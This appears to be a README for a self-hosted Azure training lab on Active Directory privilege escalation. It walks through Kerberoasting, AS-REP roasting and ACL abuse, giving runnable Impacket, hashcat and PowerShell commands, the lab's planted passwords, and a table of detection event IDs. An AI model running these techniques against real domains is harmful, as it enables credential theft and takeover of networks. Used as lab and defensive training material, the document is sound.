# Active Directory Privilege Escalation

**Difficulty:** 4/5  
**Provider:** Azure  
**Estimated Time:** 1-2 hours

## Overview

Windows Server 2022 domain with a domain-joined workstation. Initial access via RDP to workstation as low-privilege domain user. Multiple privilege escalation paths to Domain Admin.

## Architecture

| Host | Role | Access |
|------|------|--------|
| DC (Standard_B2ms) | psychocorp.local domain controller | Domain Admins only |
| WS01 (Standard_B2s) | Domain-joined workstation | m.johnson (attacker entry) |

## Attack Paths

| Path | Technique | Target | Result |
|------|-----------|--------|--------|
| Kerberoast | TGS cracking | svc_backup | Backup Operators membership |
| AS-REP Roast | Pre-auth disabled | j.smith | Domain user credentials |
| ACL Abuse | GenericAll permission | IT Admins group | Domain Admin |

## Initial Access

RDP to the workstation as `PSYCHOCORP\m.johnson`:

```bash
vault outputs active-directory-t1 --sensitive
xfreerdp /v:<workstation_ip> /u:PSYCHOCORP\\m.johnson /p:<password> /cert:ignore
```

## Attack Walkthrough

### Path 1: Kerberoast

From workstation, enumerate SPNs and request TGS tickets:

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | 
    Select-Object SamAccountName, ServicePrincipalName
```

Or use Impacket from an attack box:

```bash
GetUserSPNs.py psychocorp.local/m.johnson:<password> -dc-ip <dc_private_ip> -request
```

Crack with hashcat:

```bash
hashcat -m 13100 hashes.txt wordlist.txt
```

**svc_backup password:** `Summer2024!`

svc_backup is a Backup Operator, enabling volume shadow copy abuse for NTDS.dit extraction.

### Path 2: AS-REP Roast

Find accounts without pre-authentication:

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

Request AS-REP:

```bash
GetNPUsers.py psychocorp.local/ -usersfile users.txt -dc-ip <dc_private_ip> -format hashcat
```

Crack:

```bash
hashcat -m 18200 asrep.txt wordlist.txt
```

**j.smith password:** `Welcome123`

### Path 3: ACL Abuse

Enumerate ACLs with PowerView or BloodHound:

```powershell
Get-DomainObjectAcl -Identity "IT Admins" -ResolveGUIDs | 
    Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}
```

m.johnson has GenericAll on "IT Admins" group. IT Admins is a member of Domain Admins.

Exploit:

```powershell
Add-ADGroupMember -Identity "IT Admins" -Members m.johnson

net user m.johnson /domain
whoami /groups
```

## Tools

Suggested:

- [Impacket](https://github.com/fortra/impacket) - GetUserSPNs.py, GetNPUsers.py, secretsdump.py
- [Rubeus](https://github.com/GhostPack/Rubeus) - Kerberos abuse
- [PowerView](https://github.com/PowerShellMafia/PowerSploit) - AD enumeration
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) - Attack path visualization
- [Hashcat](https://hashcat.net/hashcat/) - Hash cracking

## Detection Opportunities

| Attack | Event ID | Indicator |
|--------|----------|-----------|
| Kerberoast | 4769 | TGS requests for service accounts with RC4 |
| AS-REP Roast | 4768 | Pre-auth failures, AS-REQ without pre-auth |
| ACL Abuse | 4728, 5136 | Group membership changes |
| DCSync | 4662 | Replication requests from non-DC |

## Troubleshooting

**Workstation not domain-joined:**
- Check `C:\ws-setup.log` on workstation
- Verify DC is responding: `Test-NetConnection <dc_private_ip> -Port 389`

**Users not created:**
- Check `C:\ad-configure.log` on DC
- Verify AD services: `Get-Service ADWS,DNS,Netlogon`

**RDP fails to workstation:**
- Ensure NSG allows your IP
- Verify domain join completed (check log)

## Cleanup

```bash
vault destroy active-directory-t1
```